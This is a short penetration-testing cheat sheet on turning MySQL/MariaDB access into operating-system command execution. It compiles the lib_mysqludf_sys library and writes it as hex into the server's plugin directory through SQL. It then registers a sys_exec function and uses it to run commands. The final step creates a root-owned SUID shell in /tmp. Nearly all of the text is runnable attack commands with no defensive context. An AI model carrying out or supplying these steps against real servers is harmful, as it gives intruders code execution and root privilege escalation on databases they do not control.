## SQL Exploits

Exploit Plugins to execute code, substituting shellcode for SHELLCODE

This will probably require root access on the DB unless the user has the FILE permissions.

1. Git clone https://github.com/mysqludf/lib_mysqludf_sys.git.

2. Install the required libraries:

   ```bash
   sudo apt update && sudo apt install default-libmysqlclient-dev  
   ```

3. Modify the Makefile to adjust it for MariaDB on Kali:

   ```bash
   LIBDIR=/usr/lib
   install:
   
   # Change this line's `I` option for mysql
   gcc -Wall -I/usr/include/mysql -I. -shared lib_mysqludf_sys.c -o $(LIBDIR)/lib_mysqludf_sys.so
   
   # To this:
   gcc -Wall -I/usr/include/mariadb/server -I/usr/include/mariadb/ -I/usr/include/mariadb/server/private -I. -shared lib_mysqludf_sys.c -o lib_mysqludf_sys.so
   ```

4. Run the make command to create a .so file:

   ```bash
   make
   ```

5. Dump the contents of the .so file to be used to create it through mysql commands on the Databse:

   ```bash
   xxd -p lib_mysqludf_sys.so | tr -d '\n' > lib_mysqludf_sys.so.hex
   ```

6. Insert the shellcode into the script below after the `0x` and run the commands to create the plugin on the mysql server.

   ```sql
   # Store the shellcode in a variable
   set @shellcode = 0xHEX_SHELLCODE_GOES_HERE;
   # Notice no quotes are used above, so that maria interprets it as binary and not as a string
   # Verify the plugin directory location
   select @@plugin_dir;
   # Create a file in the plugin directory with the shellcode contents
   select binary @shellcode into dumpfile 'PLUGIN_DIR/file.so';
   # Create the function
   create function sys_exec returns int soname 'file.so';
   # Verify the function was created
   select * from mysql.func where name='sys_exec' \G
   ```

7. You can now execute commands using the sys_exec function with the database:

   ```bash
   select sys_exec('cmd1; cmd2; etc')
   
   # If mysql is running as root, you can create a bash shell owned by root with SUID set on it
   select sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh')
   ```


Alternate way to upload a file:  https://neetech18.blogspot.com/2019/10/sql-injection-with-file-upload.html